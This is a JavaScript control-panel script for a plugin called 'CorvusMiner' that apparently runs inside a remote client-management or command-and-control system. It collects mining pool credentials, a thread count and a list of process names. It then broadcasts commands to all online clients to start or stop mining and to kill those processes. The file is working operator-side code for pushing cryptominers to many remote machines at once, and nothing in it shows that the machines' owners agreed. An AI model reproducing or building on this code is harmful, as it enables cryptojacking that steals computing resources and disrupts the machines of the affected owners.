const params = new URLSearchParams(window.location.search);
const logEl = document.getElementById("log");
const poolInput = document.getElementById("pool");
const usernameInput = document.getElementById("username");
const passwordInput = document.getElementById("password");
const threadsHintInput = document.getElementById("threads-hint");
const killProcessesInput = document.getElementById("kill-processes");
const startMiningBtn = document.getElementById("start-mining-btn");
const stopMiningBtn = document.getElementById("stop-mining-btn");

const pluginId = "corvusminer";
const clientId = params.get("clientId") || "";

function log(line) {
  const ts = new Date().toISOString();
  logEl.textContent = `${ts} ${line}\n` + logEl.textContent;
}

async function sendEvent(event, payload) {
  if (!clientId) { log("Missing clientId"); return; }
  const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}/plugins/${pluginId}/event`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ event, payload }),
  });
  if (!res.ok) { log(`Send failed: ${res.status} ${await res.text()}`); return; }
  log(`Sent event to client: ${event}`);
}

async function sendEventToAllClients(event, payload) {
  try {
    const res = await fetch("/api/clients?status=online&pageSize=1000");
    if (!res.ok) {
      log(`Failed to fetch clients: ${res.status}`);
      return;
    }
    const { items } = await res.json();
    const onlineIds = items.filter(c => c.online).map(c => c.id);
    
    if (!onlineIds.length) {
      log(`No online clients found`);
      return;
    }
    
    log(`Broadcasting "${event}" to ${onlineIds.length} online client(s)...`);
    
    let success = 0, failed = 0;
    for (const clientId of onlineIds) {
      const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}/plugins/${pluginId}/event`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ event, payload }),
      });
      if (res.ok) {
        success++;
        log(`  ✓ ${clientId}`);
      } else {
        failed++;
        log(`  ✗ ${clientId} (${res.status})`);
      }
    }
    log(`Broadcast complete: ${success} success, ${failed} failed`);
  } catch (err) {
    log(`Broadcast error: ${err.message}`);
  }
}

startMiningBtn.addEventListener("click", () => {
  const pool = poolInput.value.trim();
  const username = usernameInput.value.trim();
  const password = passwordInput.value.trim();
  const threadsHint = parseInt(threadsHintInput.value) || 100;
  const killProcesses = killProcessesInput.value.trim().split(/[,;\s]+/).filter(p => p.length > 0);
  
  if (!pool || !username) {
    log("Pool and Username are required");
    return;
  }
  
  sendEventToAllClients("mining_start", {
    pool,
    username,
    password: password || "x",
    threads_hint: threadsHint,
    kill_processes: killProcesses
  });
});

stopMiningBtn.addEventListener("click", () => {
  sendEventToAllClients("mining_stop", {});
});

if (typeof EventSource !== "undefined") {
  log("Ready — CorvusMiner (global broadcast)");
}
